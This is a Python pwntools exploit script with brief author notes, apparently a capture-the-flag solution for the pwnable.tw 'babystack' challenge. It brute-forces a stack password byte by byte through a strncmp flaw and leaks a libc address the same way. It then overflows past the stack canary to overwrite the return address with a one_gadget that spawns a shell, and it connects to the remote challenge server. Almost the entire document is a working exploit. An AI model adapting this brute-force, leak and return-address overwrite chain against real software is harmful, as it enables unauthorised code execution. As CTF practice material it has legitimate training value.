#!/usr/bin/python3
from pwn import *

exe = './babystack'
elf = context.binary = ELF(exe)
libc = ELF("libc.so.6")

def start(argv=[], *a, **kw):

    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* 0x555555400ebb
    b* 0x555555400ff1
    starti
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def brute(len, flag=False):
    secret=""
    for i in range(len):
        print("1")
        for j in range(0x1,0x100):
            if flag is True and j == 0x10:
                continue
            p.recvuntil(">> ")
            p.sendline("1")
            p.recvuntil("Your passowrd :")
            temp = secret+chr(j)+"\x00"
            p.sendline(temp)
            recv = p.recv(50)
            print(recv)
            if b"Success" in recv:
                secret += chr(j)
                p.recvuntil(">> ")
                p.sendline("1")
                break
    return secret

def login(passwd):
    p.send("1")
    p.sendafter("passowrd :",passwd)

def logout():
    p.sendafter(">>","1")

def copy(cnt):
    p.sendafter(">>","3")
    p.sendafter("Copy :", cnt)

rem = True
if(rem):
    p = remote("chall.pwnable.tw", 10205)
else:
    p = start()

passwd = brute(16,)
log.info(f"password: {passwd.encode()}")

# login(passwd)
login(b'\x00' + b"A"*80)
copy("A"*63)
logout()
guess='A'*0x10
# pause()
for _ in range(0x6):
    for i in range(0x1,0x100):
        p.recvuntil(">> ")
        p.sendline(str(1))
        p.recvuntil(":")
        p.send(guess+chr(i)+'\x00')
        recv=p.recvuntil("\n")
        if b'Success' in recv:
            guess+=chr(i)
            p.recvuntil(">> ")
            p.sendline(str(1))
            break

leak = u64(guess[-6::].ljust(8, "\x00"))
libc.address = leak - 3942961
log.info(f"leak: {hex(libc.address)}")
one_gadget=libc.address+0x45216

login(b'\x00' + b"A"*63 + passwd.encode("ISO-8859-1") + b"A"*0x18 +p64(one_gadget))
copy("A"*63)
p.sendline(b"2")

p.interactive()

'''
strncmp and strcpy are the bugs:
- you can give 0 bytes and make it pass the check.
- you can request more than 16 bytes and leak stack data. 
- stack space for the copy, login function is the same.
- IG the buffer is same for the login function and the copy function. (or next to each other)
- Final: So create the exploit payload in the password with the canary/password and then copy some bytes to make the payload bigger (no null termination) and hence overflowing into the return address and one_gadget.

weird:
they have a password verification and the checksec flag is also enabled like WOT ?

one_gadget:
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

'''